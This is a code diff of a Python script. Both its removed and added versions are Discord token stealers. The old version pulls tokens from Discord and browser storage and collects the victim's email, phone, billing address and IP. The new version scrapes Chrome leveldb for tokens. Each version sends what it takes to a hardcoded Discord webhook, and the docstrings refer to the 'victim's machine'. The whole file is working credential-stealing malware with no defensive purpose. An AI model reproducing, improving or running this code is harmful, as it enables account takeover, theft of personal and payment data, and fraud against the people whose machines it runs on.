@@ -1,287 +1,145 @@
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1389653385493348392/3A0hYW0rvHe8gv1L-2kCAnlXsZ90Emid0CVNjPlMLZx3WERjb7lV3z6keePBtoSxL1zs'
+# ruff: noqa: INP001
+import base64
+import json
+import os
+import re
+import urllib.request
+from pathlib import Path
 
-import os, json, re, urllib3, random
-if os.name != "nt": exit()
+TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
+REQUEST_HEADERS = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
+}
+WEBHOOK_URL = "https://discord.com/api/webhooks/1391884409522884628/CFzLOxvhjwZ_aN9ZKrTL2fl-R377P46jeseURJY-85mcEIa2kmUIghAG3J9H4kTk9M8B"
 
-from urllib.request import Request, urlopen
-from requests import post, get
-from datetime import datetime
 
-user_agents = ['Mozilla/5.0 (X11; Linux i686; rv:7.0) Gecko/20150626 Firefox/36.0',
-'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_5) AppleWebKit/5342 (KHTML, like Gecko) Chrome/37.0.869.0 Mobile Safari/5342',
-'Opera/8.11 (Windows NT 6.1; sl-SI) Presto/2.8.218 Version/12.00',
-'Mozilla/5.0 (Macintosh; PPC Mac OS X 10_8_3 rv:6.0) Gecko/20130514 Firefox/36.0',
-'Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; Trident/4.1)',
-'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0 rv:4.0) Gecko/20180512 Firefox/35.0',
-'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_4) AppleWebKit/5352 (KHTML, like Gecko) Chrome/40.0.820.0 Mobile Safari/5352',
-'Opera/8.83 (X11; Linux x86_64; sl-SI) Presto/2.8.187 Version/11.00',
-'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_3) AppleWebKit/5332 (KHTML, like Gecko) Chrome/40.0.829.0 Mobile Safari/5332',
-'Opera/9.63 (X11; Linux x86_64; sl-SI) Presto/2.12.183 Version/12.00']
-user_agent = random.choice(user_agents)
+def make_post_request(api_url: str, data: dict[str, str]) -> int:
+    if not api_url.startswith(("http", "https")):
+        raise ValueError
 
-ip_address = get('http://checkip.amazonaws.com').content.decode('utf8')[:-2]
+    request = urllib.request.Request(  # noqa: S310
+        api_url, data=json.dumps(data).encode(),
+        headers=REQUEST_HEADERS,
+    )
 
-def GetTokens():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-    ldb = '\\Local Storage\\leveldb'
-    paths = {
-        'Discord': roaming + '\\Discord' ,
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-        "Vivaldi" : local + "\\Vivaldi\\User Data\\Default\\"
-    }
-    grabbed = {}
-    token_ids = []
-    for platform, path in paths.items():
-        if not os.path.exists(path): continue
-        tokens = []
-        for file_name in os.listdir(path + ldb):
-            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+    with urllib.request.urlopen(request) as response:  # noqa: S310
+        return response.status
+
+
+def get_tokens_from_file(file_path: Path) -> list[str] | None:
+
+    try:
+        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
+    except PermissionError:
+        return None
+
+    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
+
+    return tokens or None
+
+
+def get_user_id_from_token(token: str) -> str | None:
+    """Confirm that the portion of a string before the first dot can be decoded.
+
+    Decoding from base64 offers a useful, though not infallible, method for identifying
+    potential Discord tokens. This is informed by the fact that the initial
+    segment of a Discord token usually encodes the user ID in base64. However,
+    this test is not guaranteed to be 100% accurate in every case.
+
+    Returns
+    -------
+        A string representing the Discord user ID to which the token belongs,
+        if the first part of the token can be successfully decoded. Otherwise,
+        None.
+
+    """
+    try:
+        discord_user_id = base64.b64decode(
+            token.split(".", maxsplit=1)[0] + "==",
+        ).decode("utf-8")
+    except UnicodeDecodeError:
+        return None
+
+    return discord_user_id
+
+
+def get_tokens_from_path(base_path: Path) -> dict[str, set]:
+    """Collect discord tokens for each user ID.
+
+    to manage the occurrence of both valid and expired Discord tokens, which happens when a
+    user updates their password, triggering a change in their token. Lacking
+    the capability to differentiate between valid and expired tokens without
+    making queries to the Discord API, the function compiles every discovered
+    token into the returned set. It is designed for these tokens to be
+    validated later, in a process separate from the initial collection and not
+    on the victim's machine.
+
+    Returns
+    -------
+        user id mapped to a set of potential tokens
+
+    """
+    file_paths = [file for file in base_path.iterdir() if file.is_file()]
+
+    id_to_tokens: dict[str, set] = {}
+
+    for file_path in file_paths:
+        potential_tokens = get_tokens_from_file(file_path)
+
+        if potential_tokens is None:
+            continue
+
+        for potential_token in potential_tokens:
+            discord_user_id = get_user_id_from_token(potential_token)
+
+            if discord_user_id is None:
                 continue
-            for line in [x.strip() for x in open(f'{path + ldb}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                    for token in re.findall(regex, line):
-                        if token in tokens:
-                            pass
-                        else:
-                            response = post(f'https://discord.com/api/v6/invite/{random.randint(1,9999999)}', headers={'Authorization': token})
-                            if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
-                                pass
-                            else:
-                                tokenid = token[:24]
-                                if tokenid in token_ids:
-                                    pass
-                                else:
-                                    token_ids.append(tokenid)
-                                    tokens.append(token)
-        if len(tokens) > 0:
-            grabbed[platform] = tokens
-    return grabbed
 
-def GetUsername(token):
-    headers = {
-        'Authorization': token,
-        'Content-Type': 'application/json'
-    }
-    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
+            if discord_user_id not in id_to_tokens:
+                id_to_tokens[discord_user_id] = set()
 
-    username = f'{info["username"]}#{info["discriminator"]}'
-    return username
+            id_to_tokens[discord_user_id].add(potential_token)
+
+    return id_to_tokens or None
 
 
-def GetUserId(token):
-    headers = {
-        'Authorization': token,
-        'Content-Type': 'application/json'
-    }
-    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
-    userid = info['id']
-    return userid
+def send_tokens_to_webhook(
+    webhook_url: str, user_id_to_token: dict[str, set[str]],
+) -> int:
+    """Caution: In scenarios where the victim has logged into multiple Discord
+    accounts or has frequently changed their password, the accumulation of
+    tokens may result in a message that surpasses the character limit,
+    preventing it from being sent. There are no plans to introduce code
+    modifications to segment the message for compliance with character
+    constraints.
+    """  # noqa: D205
+    fields: list[dict] = []
 
-def GetEmail(token):
-    headers = {
-        'Authorization': token,
-        'Content-Type': 'application/json'
-    }
-    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
-    email = info['email']
-    return email
+    for user_id, tokens in user_id_to_token.items():
+        fields.append({
+            "name": user_id,
+            "value": "\n".join(tokens),
+        })
 
-def GetPhoneNumber(token):
-    headers = {
-        'Authorization': token,
-        'Content-Type': 'application/json'
-    }
-    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
-    phone_number = info['phone']
-    return phone_number
+    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
 
-def VerifiedCheck(token):
-    headers = {
-        'Authorization': token,
-        'Content-Type': 'application/json'
-    }
-    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
-    verified = info['verified']
-    verified = bool(verified)
-    return verified
-
-def BillingCheck(token):
-    headers = {
-        'Authorization': token,
-        'Content-Type': 'application/json'
-    }
-    info = get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
-    print(info)
-    if len(info) > 0:
-        billing_info = []
-
-        addr = info[0]['billing_address']
-
-        name = addr['name']
-        billing_info.append(name)
-
-        address_1 = addr['line_1']
-        billing_info.append(address_1)
-
-        address_2 = addr['line_2']
-        billing_info.append(address_2)
-
-        city = addr['city']
-        billing_info.append(city)
-
-        postal_code = addr['postal_code']
-        billing_info.append(postal_code)
-
-        state = addr['state']
-        billing_info.append(state)
-
-        country = addr['country']
-        billing_info.append(country)
-
-        print(billing_info)
-
-        return True, billing_info
-    else:
-        return False, info
-
-def NitroCheck(token):
-    headers = {
-        'Authorization': token,
-        'Content-Type': 'application/json'
-    }
+    make_post_request(webhook_url, data)
 
 
-    has_nitro = False
-    res = get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
-    nitro_data = res.json()
-    has_nitro = bool(len(nitro_data) > 0)
-    if has_nitro:
-        has_nitro = True
-        end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-        start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-        days_left = abs((start - end).days)
+def main() -> None:
 
-        return has_nitro, start, end, days_left
-    else:
-        has_nitro = False
-        return has_nitro, nitro_data
+    chrome_path = (
+        Path(os.getenv("LOCALAPPDATA")) /
+        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
+    )
+    tokens = get_tokens_from_path(chrome_path)
 
-def GetLocale(token):
-    languages = {
-        'da'    : 'Danish, Denmark',
-        'de'    : 'German, Germany',
-        'en-GB' : 'English, United Kingdom',
-        'en-US' : 'English, United States',
-        'es-ES' : 'Spanish, Spain',
-        'fr'    : 'French, France',
-        'hr'    : 'Croatian, Croatia',
-        'lt'    : 'Lithuanian, Lithuania',
-        'hu'    : 'Hungarian, Hungary',
-        'nl'    : 'Dutch, Netherlands',
-        'no'    : 'Norwegian, Norway',
-        'pl'    : 'Polish, Poland',
-        'pt-BR' : 'Portuguese, Brazilian, Brazil',
-        'ro'    : 'Romanian, Romania',
-        'fi'    : 'Finnish, Finland',
-        'sv-SE' : 'Swedish, Sweden',
-        'vi'    : 'Vietnamese, Vietnam',
-        'tr'    : 'Turkish, Turkey',
-        'cs'    : 'Czech, Czechia, Czech Republic',
-        'el'    : 'Greek, Greece',
-        'bg'    : 'Bulgarian, Bulgaria',
-        'ru'    : 'Russian, Russia',
-        'uk'    : 'Ukranian, Ukraine',
-        'th'    : 'Thai, Thailand',
-        'zh-CN' : 'Chinese, China',
-        'ja'    : 'Japanese',
-        'zh-TW' : 'Chinese, Taiwan',
-        'ko'    : 'Korean, Korea'
-    }
+    if tokens is None:
+        return
+
+    send_tokens_to_webhook(WEBHOOK_URL, tokens)
 
 
-    headers = {
-        'Authorization': token,
-        'Content-Type': 'application/json'
-    }
-    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
-    locale = info['locale']
-    language = languages.get(locale)
-
-    return locale, language
-
-
-
-
-def SendTokens(webhook_url, tokens_grabbed = None):
-    if not tokens_grabbed: tokens_grabbed = GetTokens()
-    embed = [{'description' : ''}]
-    tokens_info = []
-    for app in list(tokens_grabbed.keys()):
-        for token in tokens_grabbed[app]:
-            tokens_info.append(token)
-        embed[0]['description'] += f'\n```diff\n+ Grabbed From {app}\n'+ '\n\n'.join(tokens_grabbed[app]) + '\n```'
-    
-    for token in tokens_info:
-        
-        username       = GetUsername(token)
-        user_id        = GetUserId(token)
-        email          = GetEmail(token)
-        phone_number   = GetPhoneNumber(token)
-        verified_check = VerifiedCheck(token)
-        billing        = BillingCheck(token)[0]
-        billing_info   = BillingCheck(token)[1]
-        nitro          = NitroCheck(token)[0]
-        locale         = GetLocale(token)[0]
-        language       = GetLocale(token)[1]
-        
-
-        embed[0]['description'] += f'\n```diff\n+ Token Info for\n{token}\n\n'
-
-        embed[0]['description'] += f'''Username   = {username}
-User Id    = {user_id}
-Ip Address = {ip_address}
-Email      = {email}
-Phone      = {phone_number}
-Verified   = {verified_check}
-Billing    = {billing}
-'''
-
-        if billing == True:
-            name        = billing_info[0]
-            address_1   = billing_info[1]
-            address_2   = billing_info[2]
-            city        = billing_info[3]
-            postal_code = billing_info[4]
-            state       = billing_info[5]
-            country     = billing_info[6]
-
-            embed[0]['description'] += f'\nName           = {name}\nAddress Line 1 = {address_1}\nAddress Line 2 = {address_2}\nCity           = {city}\nPostal Code    = {postal_code}\nState          = {state}\nCountry        = {country}\n\n'
-
-        embed[0]['description'] += f'''Nitro      = {nitro}
-'''
-
-        if nitro == True:
-            nitrostart  = NitroCheck(token)[1]
-            nitroend    = NitroCheck(token)[2]
-            daysofnitro = NitroCheck(token)[3]
-            embed[0]['description'] += f'\nNitro Started = {nitrostart}\nNitro Ends    = {nitroend}\nDays Left     = {daysofnitro}\n\n'
-
-        embed[0]['description'] += f'''Locale     = {locale}
-Language   = {language}'''
-
-
-        embed[0]['description'] += '```'
-
-
-
-    urlopen(Request(webhook_url, data=json.dumps({"embeds" : embed}).encode(), headers={'Content-Type': 'application/json','User-Agent': f'{user_agent}'}))
-
-
-SendTokens(WEBHOOK_URL)
+if __name__ == "__main__":
+    main()
